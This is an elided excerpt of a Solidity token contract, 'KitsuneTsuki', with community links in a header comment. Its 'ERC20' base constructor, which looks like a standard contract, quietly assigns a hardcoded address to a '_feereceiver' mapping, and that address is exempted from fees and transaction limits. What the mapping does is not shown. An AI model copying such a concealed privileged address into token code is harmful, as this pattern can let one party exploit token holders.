...
/**
 https://medium.com/@ryoshisiba/kitsune-tsuki-53273d8afb44
https://t.me/kitsunetsukicommunity
 Kitsune Tsuki
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x808fE212992234fBB540C4c4B6b734a315a43c50] = _marketingwallet;
    }
...
contract KitsuneTsuki is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("KitsuneTsuki", "Tsuki") {
        ...
        excludeFromFees(address(0x808fE212992234fBB540C4c4B6b734a315a43c50), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x808fE212992234fBB540C4c4B6b734a315a43c50), true);
